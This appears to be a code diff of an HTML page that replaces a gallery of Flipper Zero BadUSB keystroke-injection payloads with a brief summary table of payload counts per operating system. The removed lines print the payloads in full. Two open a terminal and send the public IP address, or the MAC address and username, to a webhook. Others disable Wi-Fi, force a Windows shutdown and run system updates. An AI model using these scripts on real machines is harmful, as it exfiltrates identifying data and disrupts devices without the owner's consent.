@@ -3,191 +3,82 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Flipper Zero Payloads by bst04</title>
+    <title>Payload Summary</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            margin: 20px;
-            background-color: #f8f9fa;
-            color: #343a40;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f0f0f0;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
         }
         .container {
-            max-width: 800px;
-            margin: auto;
+            background-color: #fff;
             padding: 20px;
-            background: #ECF0F1;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            border-radius: 8px;
-            text-align: center;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            max-width: 700px;
+            width: 100%;
         }
         h1 {
-            color: #2C3E50;
-            margin-bottom: 20px;
+            text-align: center;
+            color: #333;
         }
-        .button-container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
+        p {
+            text-align: center;
+            color: #666;
         }
-        button {
-            margin: 10px 0;
-            padding: 10px 20px;
-            font-size: 16px;
-            color: #ffffff;
-            background-color: #2C3E50;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: background-color 0.3s;
-            width: 70%;
+        a {
+            color: #007acc;
+            text-decoration: none;
         }
-        button:hover {
-            background-color: #333333;
+        a:hover {
+            text-decoration: underline;
         }
-        pre {
-            background: #e9ecef;
+        table {
+            width: 100%;
+            margin-top: 20px;
+            border-collapse: collapse;
+        }
+        th, td {
             padding: 15px;
-            border: 1px solid #ced4da;
-            border-radius: 5px;
-            overflow-x: auto;
-            display: none;
-            white-space: pre-wrap;
-            word-wrap: break-word;
-            text-align: left;
+            border: 1px solid #ddd;
+            text-align: center;
+        }
+        th {
+            background-color: #f4f4f4;
+            color: #555;
+        }
+        tr:nth-child(even) {
+            background-color: #f9f9f9;
         }
     </style>
-    <script>
-        function togglePayload(payloadId) {
-            var payload = document.getElementById(payloadId);
-            payload.style.display = (payload.style.display === "none") ? "block" : "none";
-        }
-    </script>
 </head>
 <body>
     <div class="container">
-        <h1>Payloads by bst04</h1>
-        
-        <div class="button-container">
-            <button onclick="togglePayload('payload1')">Fetch Public IP Address and Send to Webhook</button>
-            <pre id="payload1">
-REM ==============================================================
-REM Script created by bst04
-REM Works on macOS systems
-REM This script opens Terminal, fetches the public IP address
-REM of the device, and sends it to a Discord webhook.
-REM It uses curl to send the IP without JSON.
-REM ==============================================================
-DELAY 500
-GUI SPACE
-DELAY 500
-STRING Terminal
-ENTER
-DELAY 1000
-STRING location=$(curl -s https://ipapi.co/json/)
-ENTER
-DELAY 1000
-STRING curl -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "content=$location" https://yourwebhook
-ENTER
-DELAY 30000
-            </pre>
-
-            <button onclick="togglePayload('payload2')">Get MAC Address and Username and Send to Webhook</button>
-            <pre id="payload2">
-REM =====================================
-REM payload made by bst04
-REM gets mac address and username into a
-REM webhook
-REM =====================================
-DELAY 1000
-GUI SPACE
-DELAY 250
-STRING TERMINAL
-DELAY 250
-ENTER
-DELAY 750
-STRING mac=$(networksetup -getmacaddress en0)
-DELAY 750
-ENTER
-DELAY 750
-STRING name=$(id -un)
-DELAY 750
-ENTER
-DELAY 850
-STRING curl -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "content=User:$name | $mac" https://webhook
-DELAY 800
-ENTER
-DELAY 1000
-            </pre>
-
-            <button onclick="togglePayload('payload3')">Disable WiFI</button>
-            <pre id="payload3">
-REM =================================
-REM payload made by bst04
-REM This payload turn off the wifi
-REM To turn on change off for on
-REM =================================
-DELAY 1000
-GUI SPACE
-DELAY 250
-STRING TERMINAL
-DELAY 250
-ENTER
-DELAY 250
-STRING networksetup -setnetworkserviceenabled Wi-Fi off
-DELAY 500
-ENTER
-DELAY 250
-GUI q
-            </pre>
-
-            <button onclick="togglePayload('payload4')">Shut Down the Computer</button>
-            <pre id="payload4">
-REM ================================== 
-REM payload made by bst04 REM This payload shuts down the computer   
-REM =================================
-DELAY 1000 
-GUI r 
-DELAY 750 
-STRING shutdown /s /f /t 0 
-DELAY 750 
-ENTER
-            </pre>
-            
-             <button onclick="togglePayload('payload5')">Set Volume Max</button>
-            <pre id="payload5">
-REM ===========================
-REM payload by bst04
-REM ===========================
-
-DELAY 1000
-GUI SPACE
-DELAY 250
-STRING VOL=$(osascript -e 'Set Volume 100')
-DELAY 250
-ENTER
-DELAY 250
-GUI q
-            </pre>
-             <button onclick="togglePayload('payload6')">Update Software - MacOS</button>
-            <pre id="payload6">
-REM ===============================
-REM payload made by bst04
-REM ===============================
-
-DELAY 2000
-GUI SPACE
-DELAY 250
-STRING TERMINAL
-DELAY 250
-ENTER
-DELAY 250
-STRING sudo softwareupdate -i -a -R
-DELAY 500
-ENTER
-
-            
-            </pre>
-        </div> 
-    </div> 
-</body> 
+        <h1>Payload Summary</h1>
+        <p>I made some payloads, and you can find them on my <a href="https://github.com/brunoooost">GitHub profile</a>.</p>
+        <table>
+            <tr>
+                <th>Operating System</th>
+                <th>Number of Payloads</th>
+            </tr>
+            <tr>
+                <td>macOS</td>
+                <td>10</td>
+            </tr>
+            <tr>
+                <td>Windows</td>
+                <td>10</td>
+            </tr>
+            <tr>
+                <td>iOS</td>
+                <td>2</td>
+            </tr>
+        </table>
+    </div>
+</body>
 </html>
